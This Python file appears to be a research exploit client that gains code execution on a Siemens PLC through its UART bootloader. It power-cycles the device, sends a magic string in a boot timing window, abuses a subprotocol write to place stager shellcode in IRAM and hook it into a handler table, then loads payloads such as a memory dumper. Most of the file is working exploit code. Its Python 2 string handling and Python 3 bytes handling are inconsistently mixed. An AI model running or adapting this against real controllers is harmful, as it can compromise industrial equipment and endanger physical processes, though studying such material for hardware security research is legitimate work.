#!/usr/bin/env python
# Would you please hold my beer while I am cleaning this code?
# ./client.py --switch-power --powersupply-host=localhost --powersupply-port=9001 --powersupply-delay=10 run -p payloads/hello_world/hello_world.bin


import struct
import time
import socket
import select
import sys
import subprocess
#import crc32be
import os
import argparse

from binascii import hexlify

from pwn import remote,context,log,xor
context.update(log_level="info", bits=32, endian="big")



# Runtime configs
# The number of seconds to sleep between every request to avoid UART buffer overflows
SEND_REQ_SAFETY_SLEEP_AMT = 0.05


# The default location of the stager payload
STAGER_PL_FILENAME = "payloads/stager/stager.bin"


# The default location of the memory dumping payload used for the dump_mem command
DUMPMEM_PL_FILENAME = "payloads/dump_mem/build/dump_mem.bin"

# The address of the first payload we are injecting
FIRST_PAYLOAD_LOCATION = 0x10010100


# FIRST_PAYLOAD_LOCATION = 0x06D8C300
next_payload_location = FIRST_PAYLOAD_LOCATION

# Maximum number of bytes to be sent in one request (Sending chunks larger than 16 bytes seems to overflow the read buffer)
# MAX_MSG_LEN = 64-2
MAX_MSG_LEN = 192-2

# Addresses used to inject shellcode (different values are possible here)
DEFAULT_STAGER_ADDHOOK_IND = 0x20


# For installing an additional hook, we also assign a default index
DEFAULT_SECOND_ADD_HOOK_IND = 0x1a

#IRAM_STAGER_START = 0x1003AD00
#IRAM_STAGER_END = 0x10040000
IRAM_STAGER_START = 0x10030100
IRAM_STAGER_END = 0x100303FC
#IRAM_STAGER_START = 0x10010000
#IRAM_STAGER_END = 0x10020000
IRAM_STAGER_MAX_SIZE = IRAM_STAGER_END - IRAM_STAGER_START

BOOTLOADER_EMPTY_MEM = 0x20000

# Some constants that make the code a bit more easy to read
ANSW_INVALID_CHECKSUM = "\xff\x80\x03"
ANSW_ENTER_SUBPROTO_SUCCESS = "\x80\x00"

# Static Addresses
UART_WRITE_BUF = 0x100367EC
UART_READ_BUF = 0x100366EC
ADD_HOOK_TABLE_START = 0x1003ABA0

# subprotocol handler constants
SUBPROT_80_MODE_IRAM = 1
SUBPROT_80_IOC_SPI = 2
SUBPROT_80_MODE_FLASH = 3
SUBPROT_80_MODE_NOP = 4

SUBPROT_80_MODE_MAGICS = [None, 0x3BC2, 0x9d26, 0xe17a, 0xc54f]


def print_answ(r, answ):
    print("Got answer: {} [{}]".format(repr(answ), answ.hex() if isinstance(answ, bytes) else hexlify(answ).decode()))


def calc_checksum_byte(incoming): # Type hint for clarity
    # Format: <len_byte><byte_00>..<byte_xx><checksum_byte>
    # Checksum: LSB of negative sum of byte values
    length_val = incoming[0]
    # Sum bytes from index 1 up to 1+length_val (exclusive of checksum itself)
    current_sum = sum(incoming[0:1+length_val]) # Sum includes the length byte itself up to last content byte
    # LSB of negative sum
    checksum_val = (-current_sum) & 0xFF
    return bytes([checksum_val])


def send_packet(r, msg, step=2, sleep_amt=0.01): # Type hint for clarity
    """
    The base function to send a single packet. We need to chunk the packet
    up during transmission as to not overflowing the PLC's UART buffer.

    Parameters
        r: the remote
        msg: the packet to be sent
        step: The number of bytes to send between delays
        sleep_amt: the number of seconds to delay each chunk
    """

    # Length has to fit into 1 byte, buffer also is just 256 bytes
    assert(len(msg) <= MAX_MSG_LEN)
    time.sleep(SEND_REQ_SAFETY_SLEEP_AMT)
    # First we need to pass the length
    # msg is payload bytes, prepend length byte
    full_msg_before_checksum = bytes([len(msg) + 1]) + msg
    # Then add the checksum to the packet
    checksum = calc_checksum_byte(full_msg_before_checksum)
    full_msg_with_checksum = full_msg_before_checksum + checksum

    log.info("sending packet: {}".format(full_msg_with_checksum.hex()))
    for i in range(0, len(full_msg_with_checksum), step):
        time.sleep(sleep_amt)
        r.send(full_msg_with_checksum[i:i+step])


def recv_packet(r): # Returns bytes
    """
    Receive a single packet, verifying and discarding
    checksum and length metadata.

    returns The actual contents of the packet without any metadata
    """

    answ_first_byte = r.recv(1) # This is bytes
    if not answ_first_byte:
        # Handle case where recv returns empty, e.g. connection closed
        log.error("recv_packet: Connection closed or no data received for length byte.")
        return None # Or raise an exception

    # answ_first_byte is the <Length> byte. Its value, L, is the number of bytes that follow
    # (i.e., length of <Contents> + 1 for <ChecksumByte>).
    length_of_following_data = answ_first_byte[0]

    if length_of_following_data == 0:
        # This implies an empty <Contents> and no <ChecksumByte>, which seems unlikely for this protocol.
        # Or it means <Contents> is empty, and only <ChecksumByte> follows (L=1).
        # If L=0, it's probably an error or unexpected packet.
        # The original code would try to read 0 bytes and then checksum answ_first_byte itself.
        log.warn("recv_packet: Received packet length L=0 (meaning 0 bytes follow length-byte). This is unusual.")
        # For an empty payload ack, L=1 (for checksum), packet is <0x01><checksum>. Content is empty.
        # If L=0, calc_checksum_byte(answ_first_byte[:-1]) would be on empty bytes if answ_first_byte is just one byte.
        # This case should be handled by the checksum logic: if a packet is just <0x00>, it's invalid.
        # Smallest valid packet is <0x01><checksum_byte> (e.g. ack). Content part is empty.
        # Smallest packet with content: <0x02><content_byte><checksum_byte>. Content is one byte.
        pass # Let the reading logic proceed. If length_of_following_data is 0, loop won't run.

    received_payload_and_checksum = b""
    bytes_remaining_to_read = length_of_following_data

    while bytes_remaining_to_read > 0:
        chunk = r.recv(bytes_remaining_to_read)
        if not chunk:
            log.error("recv_packet: Connection closed while reading payload/checksum.")
            return None # Or raise an exception for critical failure
        received_payload_and_checksum += chunk
        bytes_remaining_to_read -= len(chunk)

    # full_packet_as_sent_on_wire_minus_initial_length_byte = received_payload_and_checksum
    # full_packet_including_length_byte = answ_first_byte + received_payload_and_checksum

    packet_for_checksum_calc = answ_first_byte + received_payload_and_checksum[:-1] # <L><Contents>
    received_checksum = received_payload_and_checksum[-1:] # <ChecksumByte>

    if not packet_for_checksum_calc: # Should not happen if length_of_following_data >= 1
        log.error("recv_packet: Packet too short, no data for checksum calculation.")
        return None
    if not received_checksum: # Should not happen if length_of_following_data >= 1
        log.error("recv_packet: Packet too short, no checksum byte found.")
        return None

    calculated_checksum = calc_checksum_byte(packet_for_checksum_calc)

    if calculated_checksum != received_checksum:
        print("Checksum validity failed. Received Packet (L+Payload+CS): {} [{}], Calculated CS for (L+Payload): {}, Expected CS: {}".format(
            repr(answ_first_byte + received_payload_and_checksum),
            (answ_first_byte + received_payload_and_checksum).hex(),
            calculated_checksum.hex(),
            received_checksum.hex()))
        return None
    else:
        # Return only the <Contents> part
        # <Contents> is received_payload_and_checksum[:-1]
        return received_payload_and_checksum[:-1]


def recv_many(r, verbose=False): # Returns bytes
    """
    Receive all packets until an empty packet is received.
    
    This protocol is implemented by some custom payloads such
    as dump_mem to send larger amounts of data at once.
    """

    answ = b"" # Changed to bytes
    stop = False

    while not stop:
        next_chunk = recv_packet(r) # Returns bytes or None
        if next_chunk is None: # Error in recv_packet or connection closed
            log.error("recv_many: Failed to receive next chunk.")
            return None # Propagate error

        if verbose and (len(answ) & 0xff) < 16: # len(answ) is fine for bytes
            print("Read {}".format(len(answ))) # This print is fine

        if next_chunk == b"": # Changed to bytes
            stop = True
        else:
            answ += next_chunk # Bytes concatenation
    return answ

def encode_packet_for_stager(chunk):
    """
    Encodes a packet for null-byte free transmission to the stager.
    Xor is used to do the encoding. The key is chosen for the chunk
    not to include null bytes which seem to result in the largest
    amount of failing transmissions over UART.
    
    The encoding has to be reversed on the other side which is
    implemented in the payloads/stager sources
    """
    # chunk must be bytes
    for i in range(1, 256):
        # Check if byte `i` is in chunk (bytes comparison) or if `i` is the encoded length.
        # `bytes([i]) not in chunk` is not direct. Need `bytes([i]) != x for x in chunk` or `i not in chunk` if chunk is list of ints.
        # Original `chr(i) not in chunk` implies chunk was a string.
        # If chunk is bytes: `bytes([i])` is a single byte. `chunk` is a sequence of bytes.
        # `i not in chunk` checks if the integer value i is one of the byte values in chunk.
        # `i != len(chunk)+2` is comparing int with int.

        # Assuming `chunk` is bytes. The key `i` should not be present in the chunk.
        # Also, the key `i` should not be equal to the length of the *encoded* chunk, which is `len(chunk) + 1` (for the key itself).
        # The original `len(chunk)+2` might be from `len(payload_to_send_to_send_packet)` which includes length byte.
        # Let's stick to original logic `i != len(chunk)+2` for now, assuming it relates to overall packet structure for stager.
        if i not in chunk and i != (len(chunk) + 2): # Check if int i is in bytes chunk
            log.info("Sending chunk with xor key: 0x{:02x}".format(i))
            # XOR each byte in the chunk with the key i
            xored_chunk = bytes([b ^ i for b in chunk])
            encoded = bytes([i]) + xored_chunk # Prepend key

            # A quick attempt at a fix for a specific value-dependent UART failure
            #if b"\xfe\xfe" in encoded: # Compare bytes with bytes
            #    continue
            return encoded # Returns bytes

    print("Could not encode chunk: {}".format(chunk.hex())) # chunk is bytes
    assert (False)

def send_full_msg_via_stager(r, msg, chunk_size=2, sleep_amt=0.01): # msg is bytes
    """
    Transmit an arbitrarily sized message to a listening stager payload.

    The protocol doing the transmission sends an encoded packet, expecting
    an empty acknowledgement packet in return for each packet sent.
    """

    for i in range(0, len(msg), MAX_MSG_LEN-1):
        time.sleep(SEND_REQ_SAFETY_SLEEP_AMT)
        chunk = msg[i:i + MAX_MSG_LEN - 1]
        log.info("Send progress: 0x{:06x}/0x{:06x} ({:3.2f})".format(i, len(msg), float(i)/float(len(msg))))
        send_packet(r, encode_packet_for_stager(chunk), chunk_size, sleep_amt) # encode_packet_for_stager returns bytes
        answ = recv_packet(r) # Returns bytes or None
        if answ is None:
            log.error("send_full_msg_via_stager: Did not receive ACK after sending chunk.")
            return None # Propagate error

        if not len(answ) == 1: # len() is fine for bytes
            print("expecting empty ack package (answ of size 1), got '{}' instead".format(repr(answ))) # Use repr for bytes
            assert(False)
        if answ == b"\xff": # Compare bytes with bytes
            print("[WARNING] Interrupting the sending...")
            return None
    # Send empty packet to signify end of transmission
    send_packet(r, encode_packet_for_stager(b"")) # Pass bytes to encode_packet_for_stager
    answ = recv_packet(r) # Returns bytes or None
    if answ is None:
        log.error("send_full_msg_via_stager: Did not receive ACK after sending empty packet.")
        return None # Propagate error


def invoke_primary_handler(r, handler_ind, args=b"", await_response=True): # args should be bytes
    """
    Invoke the primary handler with index handler_ind.
    """

    payload = bytes([handler_ind]) # Changed to bytes
    # args is already bytes due to type hint
    send_packet(r, payload + args)
    if await_response:
        return recv_packet(r) # Returns bytes or None
    else:
        return None


def enter_subproto_handler(r, mode, args=""):
    """
    Invoke Primary Handler 0x80 to enter the subprotocol
    in the given mode.
    """
    assert(1 <= mode <= len(SUBPROT_80_MODE_MAGICS))
    # struct.pack returns bytes. args for enter_subproto_handler should be bytes.
    packed_magic = struct.pack(">H", SUBPROT_80_MODE_MAGICS[mode])
    return invoke_primary_handler(r, 0x80, packed_magic + args)


def leave_subproto_handler(r):
    """ 
    Leave the currently active subprotocol handler
    """
    send_packet(r, b"\x81\xD0\x67") # Changed to bytes
    return recv_packet(r)


def subproto_read(r):
    send_packet(r, b"\x83") # Changed to bytes
    return recv_packet(r)

def _raw_subproto_write(r, arg_dw, add_args, really=False, step=2, sleep_amt=0.01): # add_args is bytes
    """
    Only use when alredy in subprotocol handler.
    
    This is the raw write protocol (function 3) invocation for the different modes.
    Invoking this function may have different semantics depending on the mode the
    subprotocol handler was entered in.

    No checking on arguments is done. Don't use if you don't exactly know what you
    do as this may cause damage to the system if not used properly.

    The reason for this function being dangerous is that in some modes using this write
    leads to overwriting parts or all of flash memory.
    """

    # This one is dangerous to use as it may mess up stuff in the device
    assert(really == True)
    # struct.pack returns bytes. add_args is bytes.
    send_packet(r, b"\x84\x5a\x2e" + struct.pack(">I", arg_dw) + add_args, step, sleep_amt)
    return recv_packet(r)


def _exploit_write_chunk_to_iram(r, tar, contents, already_in_80_handler=False): # contents is bytes
    """
    This function is part of the exploit and allows writing small chunks
    of bytes into IRAM memory. With the primitive itself being slow and
    unstable, we need some special handling for seemingly magic values to
    make the write process stable.
    """

    # Writing more than 4 bytes at a time does not seem stable
    #assert(len(contents) == 2 or len(contents)==4 or len(contents)==8)
    assert(len(contents) % 2 == 0)
    assert(len(contents)+8 <= MAX_MSG_LEN)
    # This is the minimum address we are allowed to write to
    assert(0x10000000 <= tar)
    # This boundary is checked by the bootloader handler
    assert(tar + len(contents) <= 0x10800000)

    # First enter the 0x80 subprotocol with device/target number 1 for IRAM if we are not already in the handler
    if not already_in_80_handler:
        answ = enter_subproto_handler(r, SUBPROT_80_MODE_IRAM)
    # In the bootloader handler the base of IRAM memory (0x10000000) is added, so subtract it here
    target_argument = tar-0x10000000

    # First mask the contents with \xff's which allows all transitions
    answ = _raw_subproto_write(r, target_argument, len(contents)*"\xff", True)
    # Perform the write against the 0xffff words now

    # One write that we cannot perform for dwords is a straight 0x0000 word. We have to do that as a single word for some reason
    if len(contents) == 4 and (contents[:2] in ["\x00\x00", "\x0a\x00"] or contents[2:4] in ["\x00\x00", "\x0a\x00"]):
        # Split the write into two word writes
        answ = _raw_subproto_write(r, target_argument, contents[:2], True)
        answ = _raw_subproto_write(r, target_argument+2, contents[2:4], True)
    else:
        # Do the write in one go
        answ = _raw_subproto_write(r, target_argument, contents, True)

    # Leave the 0x80 subhandler if needed
    if not already_in_80_handler:
        leave_subproto_handler(r)
    return answ


def exploit_write_to_iram(r, tar, contents):
    """
    Wrapper function to write a whole payload to IRAM. Call this
    function without entering the subprotocol first. The function
    will:
        1. enter subprotocol handler
        2. align input length to multiple of 4
        3. write contents in chunks
        4. leave subprotocol handler
    """

    assert(len(contents) % 2 == 0)  # writes are performed word-wise
    # Make sure we stay in bounds with our write
    assert(0x10000000 <= tar and tar + len(contents) <= 0x10800000)

    # First enter the 0x80 subprotocol with device/target number 1 for IRAM
    answ = enter_subproto_handler(r, SUBPROT_80_MODE_IRAM)
    assert(answ == ANSW_ENTER_SUBPROTO_SUCCESS)

    # Do a single word write at the beginning if the alignment is 2, not 4
    if len(contents) % 4 == 2:
        _exploit_write_chunk_to_iram(r, tar, contents[:2], True)
        tar += 2
        contents = contents[2:]

    chunk_size = 16
    # From here we have a 4 byte alignment so we can do dword writes only
    for i in range(0, len(contents), chunk_size):
        print("Writing {:04x}/{:04x}".format(i, len(contents)))
        chunk = contents[i:i+chunk_size]
        # Perform the write
        answ = _exploit_write_chunk_to_iram(r, tar+i, chunk, True)

    # Leave subprotocol handler to avoid protocol state side effects
    leave_subproto_handler(r)
    return answ


def get_version(r):
    """
    Invoke the Primary Handler which returns the protocol version
    """

    hook_ind = 0  # get_version
    send_packet(r, chr(hook_ind))
    answ = recv_packet(r)
    return answ


def bye(r):
    """
    Invoke the Primary Handler to leave the primary UART protocol loop.
    """
    hook_ind = 0xa2
    send_packet(r, chr(hook_ind))
    answ = recv_packet(r)
    # For good measure check that we got the correct response and we are indeed in sync
    assert(answ == "\xa2\x00")




def invoke_add_hook(r, add_hook_no, args="", await_response=True):
    # Check range for additional hook
    assert(0 <= add_hook_no <= 0x20)
    # Also check that the size of arguments that we input matches the expected value
    # expected_arglen, fn_addr = add_handler_entries[add_hook_no]
    #assert(expected_arglen-3==len(args) or expected_arglen==0xff)
    hook_ind = 0x1c
    args = chr(add_hook_no)+args
    return invoke_primary_handler(r, hook_ind, args, await_response)


def _exploit_install_add_hook(r, tar_addr, shellcode, add_hook_no):
    """
    Inject shellcode to a location inject a pointer to it into the add_hook table.

    This function is a wrapper around different UART APIs. The following steps are taken:
    1. Write shellcode to tar_addr
    2. Write (length param, function pointer) pair to the specified offset inside the add_hooks table

    After the injection is done the hook should be callable via
            invoke_add_hook(r, add_hook_no)
    """
    # 0x21 add_hook entries in table
    assert(0 <= add_hook_no <= 0x20)

    # Ensure alignment
    if len(shellcode) % 2 != 0:
        shellcode += "\xff"

    exploit_write_to_iram(r, tar_addr, shellcode)
    exploit_write_to_iram(r, ADD_HOOK_TABLE_START+8 *
                          add_hook_no+2, "\x00\xff"+struct.pack(">I", tar_addr))


def install_stager(r, shellcode, tar_addr=IRAM_STAGER_START, add_hook_no=DEFAULT_STAGER_ADDHOOK_IND):
    """
    Installs the stager payload as an add_hook entry from a file containing the stager shellcode.

    Returns the hook_number at which the handler was installed
    """
    assert(0 < len(shellcode) <= IRAM_STAGER_MAX_SIZE)
    _exploit_install_add_hook(r, tar_addr, shellcode, add_hook_no)
    return add_hook_no


def write_via_stager(r, tar_addr, contents, stager_add_hook_ind=DEFAULT_STAGER_ADDHOOK_IND):
    invoke_add_hook(r, stager_add_hook_ind,
                       struct.pack(">I", tar_addr), False)
    send_full_msg_via_stager(r, contents, 8, 0.05) # Increased sleep_amt


def install_addhook_via_stager(r, tar_addr, shellcode, stager_addhook_ind=DEFAULT_STAGER_ADDHOOK_IND, add_hook_no=DEFAULT_SECOND_ADD_HOOK_IND):
    # Automatically adjust to the user adding more payloads
    global next_payload_location
    
    # Set up function pointer and disable arbitrary argument length check (by setting value 0xff)
    write_via_stager(r, ADD_HOOK_TABLE_START+8*add_hook_no,
                     "\x00\x00\x00\xff"+struct.pack(">I", tar_addr), stager_addhook_ind)

    # Write the code of the handler itself
    write_via_stager(r, tar_addr, shellcode, stager_addhook_ind)

    if tar_addr == next_payload_location:
        next_payload_location += len(shellcode)
        while next_payload_location % 4 != 0:
            next_payload_location += 1

    return add_hook_no


def payload_dump_mem(r, tar_addr, num_bytes, addhook_ind):
    """
    This function uses payloads/dump_mem to dump memory contents.
    """
    answ = invoke_add_hook(
        r, addhook_ind, "A"+struct.pack(">II", tar_addr, num_bytes))
    log.debug("[payload_dump_mem] answ (len: {}): {}".format(len(answ), answ))
    assert(answ.startswith("Ok"))
    contents = recv_many(r, verbose=True)
    return contents



def handle_conn(r, action, args):
    global next_payload_location

    print("[+] Got connection")
    # The initial greeting from the PLC (unrecv'd by main) is not in our custom packet format.
    # Read it raw, e.g., until newline.
    try:
        answ = r.recvuntil(b'\n', timeout=2.0)
        log.info("Raw PLC greeting received: %r", answ)
        print('\x1b[6;30;42m'+ "[+] Got special access greeting: {} [{}]".format(answ, hexlify(answ))+ '\x1b[0m')
    except Exception as e:
        log.error("Error receiving initial PLC greeting: %s", str(e))
        # Decide if to proceed or raise. For now, log and proceed, get_version might fail.
        # If this happens, the connection might be stale or PLC not responding as expected.

    for i in range(1):
        version = get_version(r)
        bootloaderversion=version[2:3]+".".join([str(ord(c)) for c in version[3:-2]])
        print('\x1b[6;30;42m'+ "[+] Got PLC bootLoader version: " + bootloaderversion + '\x1b[0m')



    # First, always install the stager payload
    start = time.time()
    stager_addhook_ind = install_stager(r, args.stager.read())
    print("Writing the initial stage took {} seconds".format(time.time()-start))

    if action == ACTION_INVOKE_HOOK:
        payload = args.payload.read()
    elif action == ACTION_DUMP:
        payload = args.payload.read()
    elif action == ACTION_TEST:
        payload = args.payload.read()
    elif action == ACTION_TIC_TAC_TOE:
        payload = args.payload.read()
    elif action == ACTION_HELLO_LOOP:
        payload = args.payload.read()
    else:
        print("Unknown action")
        exit(-1)

    if payload is not None:
        start = time.time()
        second_addhook_ind = install_addhook_via_stager(r, next_payload_location, payload, stager_addhook_ind)
        print("Installing the additional hook took {} seconds".format(time.time()-start))

    
    if action == ACTION_INVOKE_HOOK:
        answ = invoke_add_hook(r, second_addhook_ind, args.args)
        print("Got answer: {}".format(answ))

    elif action == ACTION_DUMP:
        if args.outfile is None:
            out_filename = "mem_dump_{:08x}_{:08x}".format(args.address, args.address + args.length)
        else:
            out_filename = args.outfile

        print("dumping a total of {} bytes of memory at 0x{:08x}".format(args.length, args.address))
        contents = payload_dump_mem(r, args.address, args.length, second_addhook_ind)
        with open(out_filename, "wb") as f:
            f.write(contents)
        print("Wrote data out to {}".format(out_filename))
    

    elif action == ACTION_TEST:
        answ = invoke_add_hook(r, second_addhook_ind)
        print("Got answer: {}".format(answ))


    elif action == ACTION_HELLO_LOOP:
        answ = invoke_add_hook(r, second_addhook_ind, await_response=False)
        while True:
            print("Got packet: {}".format(recv_packet(r)))

    elif action == ACTION_TIC_TAC_TOE:
        print("[*] Demonstrating Code Execution")
        invoke_add_hook(r, second_addhook_ind, await_response=False)
        msg = ""
        END_TOKEN = "==>"
        while END_TOKEN not in msg:
            msg = recv_packet(r)
            sys.stdout.write(msg)
            sys.stdout.flush()

            if "enter a number" in msg:
                choice = raw_input()
                send_packet(r, choice[0])

        print("[*] Done here!")


    # END test code
    print("Saying bye...")
    if args.cont:
        bye(r)
    else:
        raw_input("Press to continue loading firmware...")
        bye(r)


# To trigger the update protocol via UART, we need to send a clean magic string
magic = "MFGT1"
# The number of bytes of the handshake is 5, so with a leading "M" already in the pool and others being ignored, we need at most 4 junk bytes
pad = 4*"A"

ACTION_INVOKE_HOOK = "invoke"
ACTION_DUMP = 'dump'
ACTION_TEST = "test"
ACTION_TIC_TAC_TOE = "tictactoe"
ACTION_HELLO_LOOP = "hello_loop"
def main():
    parser = argparse.ArgumentParser(description='Trigger code execution on Siemens PLC')

    parser.add_argument('-P', '--port', dest='port', type=lambda x: int(x, 0),
                        help="local port that socat is listening to, forwarding to serial device (may also be a port forwarded via SSH", required=True)
    parser.add_argument('--switch-power', dest='switch_power', default=False, action='store_true',
                        help='switch the power adapter on and off')

    # Power Supply Arguments
    ps_group = parser.add_argument_group('Power Supply Options (used with --switch-power)')
    ps_group.add_argument('--ps-type', dest='ps_type', choices=['http', 'mitsubishi_modbus'], default='http',
                        help='Type of power supply to control (default: http).')
    ps_group.add_argument('--powersupply-delay', dest='powersupply_delay', default=60, type=lambda x: int(x, 0),
                        help="Number of seconds to wait between power off and on for power cycling (default: 60).")

    # HTTP Power Supply specific arguments
    ps_http_group = parser.add_argument_group('HTTP Power Supply (for --ps-type http)')
    ps_http_group.add_argument('--powersupply-host', dest='powersupply_host', default='powersupply',
                        help='Hostname or IP for the HTTP power supply (e.g., ALLNET device, default: powersupply).')
    ps_http_group.add_argument('--powersupply-port', dest='powersupply_port', default=80, type=lambda x: int(x, 0),
                        help="Port for the HTTP power supply (default: 80).")

    # Mitsubishi Modbus Power Supply specific arguments
    ps_modbus_group = parser.add_argument_group('Mitsubishi Modbus TCP Power Supply (for --ps-type mitsubishi_modbus)')
    ps_modbus_group.add_argument('--ps-modbus-host', dest='ps_modbus_host',
                        help='Hostname or IP for the Mitsubishi PLC Modbus TCP server.')
    ps_modbus_group.add_argument('--ps-modbus-port', dest='ps_modbus_port', default=502, type=int,
                        help='Port for the Mitsubishi PLC Modbus TCP server (default: 502).')
    ps_modbus_group.add_argument('--ps-modbus-coil', dest='ps_modbus_coil', default=0, type=int,
                        help='Modbus coil address (0-indexed) to control (default: 0).')

    parser.add_argument('-s', '--stager', dest="stager", type=argparse.FileType('rb'), default=STAGER_PL_FILENAME,
                        help='the location of the stager payload')
    parser.add_argument('-c', '--continue', dest='cont', default=False, action='store_true', help="Continue PLC execution after action completed")
    parser.add_argument('-e', '--extra', default="", dest='extra', nargs='+', help="Additional arguments for custom logic")

    subparsers = parser.add_subparsers(dest="action")
    parser_invoke_hook = subparsers.add_parser(ACTION_INVOKE_HOOK)
    parser_invoke_hook.add_argument('-p', '--payload', dest="payload", type=argparse.FileType('rb'), default=None,
                        help='The file containing the payload to be executed', required=True)
    parser_invoke_hook.add_argument('-a', '--args', default="", dest='args', nargs='+', help="Additional arguments to be passed to payload invocation")

    parser_dump = subparsers.add_parser(ACTION_DUMP)
    parser_dump.add_argument('-a', '--address', dest="address", type=lambda x: int(x, 0), help="Address to dump at", required=True)
    parser_dump.add_argument('-l', '--length', dest="length", type=lambda x: int(x, 0), help="Number of bytes to dump", required=True)
    parser_dump.add_argument('-d', '--dump-payload', dest='payload', type=argparse.FileType('rb'), default=DUMPMEM_PL_FILENAME)
    parser_dump.add_argument('-o', '--out-file', dest='outfile', default=None, help="Name of file to store the dump at")



    parser_test = subparsers.add_parser(ACTION_TEST)
    parser_test.add_argument('-p', '--payload', dest="payload", type=argparse.FileType('rb'), default="payloads/hello_world/hello_world.bin",
                        help='The file containing the payload to be executed, defaults to payloads/hello_world/hello_world.bin')

    parser_test = subparsers.add_parser(ACTION_HELLO_LOOP)
    parser_test.add_argument('-p', '--payload', dest="payload", type=argparse.FileType('rb'), default="payloads/hello_loop/build/hello_loop.bin",
                        help='The file containing the payload to be executed, defaults to payloads/hello_loop/build/hello_loop.bin')
    

    parser_test = subparsers.add_parser(ACTION_TIC_TAC_TOE)
    parser_test.add_argument('-p', '--payload', dest="payload", type=argparse.FileType('rb'), default="payloads/tic_tac_toe/build/tic_tac_toe.bin",
                        help='The file containing the payload to be executed, defaults to payloads/tic_tac_toe/build/tic_tac_toe.bin')

 

    args = parser.parse_args()

    # We are currently using pwntools for the connection as those
    # proved to be reliable. We may want to refactor this.
    s = remote("localhost", args.port)

    if args.switch_power:

        def call_switch_power(mode):
            base_cmd = ["tools/powersupply/switch_power.py"]

            if args.ps_type == 'http':
                if not args.powersupply_host:
                    log.error("HTTP power supply host (--powersupply-host) not specified.")
                    sys.exit(1)
                type_args = ["--ps-type", "http",
                             "--host", args.powersupply_host,
                             "--port", str(args.powersupply_port)]
            elif args.ps_type == 'mitsubishi_modbus':
                if not args.ps_modbus_host:
                    log.error("Mitsubishi Modbus host (--ps-modbus-host) not specified.")
                    sys.exit(1)
                type_args = ["--ps-type", "mitsubishi_modbus",
                             "--modbus-host", args.ps_modbus_host,
                             "--modbus-port", str(args.ps_modbus_port),
                             "--modbus-coil", str(args.ps_modbus_coil)]
            else:
                # Should not be reached due to argparse choices
                log.error("Invalid power supply type specified: {}".format(args.ps_type))
                sys.exit(1)

            full_cmd = base_cmd + type_args + [mode]
            log.info("Executing power control: {}".format(" ".join(full_cmd)))
            subprocess.check_call(full_cmd)

        log.info("Turning off power supply (type: {}), then sleeping for {:d} seconds...".format(args.ps_type, args.powersupply_delay))
        call_switch_power("off")

        log.info("[+] Turned off power supply, sleeping for {}s...".format(args.powersupply_delay))
        time.sleep(args.powersupply_delay)

        log.info("[+] Turning on power supply (type: {}) again...".format(args.ps_type))
        call_switch_power("on")
        log.info("[+] Successfully executed power on command.")

    print("Looping now")
    for i in range(100):
        # while True:
        # We have 500000 microseconds (half a second) to hit the timing
        s.send(pad + magic)

        answ = s.recv(256, timeout=0.3) # Reverted to short timeout
        if len(answ) > 0:
            if not answ.startswith("\5-CPU"):
                # Try to receive a bit more with a very short timeout
                # to complete a potentially fragmented response.
                try:
                    answ += s.recv(64, timeout=0.2) # Short timeout for the append
                except Exception: # Catch timeout or other read errors
                    pass # Proceed with what answ has
            assert(answ.startswith("\5-CPU"))
            s.unrecv(answ)

            handle_conn(s, args.action, args)
            break

    print("Done.")


if __name__ == "__main__":
    main()

